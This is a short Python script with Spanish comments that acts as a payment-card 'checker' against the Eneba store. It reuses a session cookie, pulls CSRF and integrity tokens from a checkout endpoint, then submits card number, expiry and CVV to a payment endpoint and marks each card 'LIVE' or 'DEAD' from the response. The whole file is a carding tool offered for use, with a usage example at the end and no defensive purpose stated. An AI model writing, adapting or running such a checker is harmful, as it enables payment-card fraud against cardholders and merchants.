import requests
import json

class EnebaChecker:
    def __init__(self, session_cookie: str):
        self.session = requests.Session()
        self.session.cookies.set('eneba_session', session_cookie)

    def get_csrf_tokens(self):
        response = self.session.get('https://www.eneba.com/api/v1/checkout')
        response.raise_for_status()
        return response.json()

    def check_card(self, card_number: str, card_exp_month: str, card_exp_year: str, card_cvv: str):
        csrf_tokens = self.get_csrf_tokens()
        csrf_token = csrf_tokens['csrfToken']
        integrity_token = csrf_tokens['integrityToken']

        payload = {
            'csrf_token': csrf_token,
            'integrity_token': integrity_token,
            'card_number': card_number,
            'card_exp_month': card_exp_month,
            'card_exp_year': card_exp_year,
            'card_cvv': card_cvv,
        }

        response = self.session.post(
            'https://www.eneba.com/api/v1/checkout/payment',
            json=payload,
            headers={
                'X-CSRF-Token': csrf_token,
                'Content-Type': 'application/json',
            }
        )

        if response.status_code == 200:
            return {'status': 'LIVE', 'response': response.json()}
        elif response.status_code == 403:
            return {'status': 'DEAD', 'message': 'Tarjeta rechazada'}
        else:
            return {'status': 'ERROR', 'message': response.text}

# Ejemplo de uso
checker = EnebaChecker('tu_cookie_de_sesion_aqui')
result = checker.check_card(
    '4242424242424242',
    '12',
    '2028',
    '123'
)
print(result)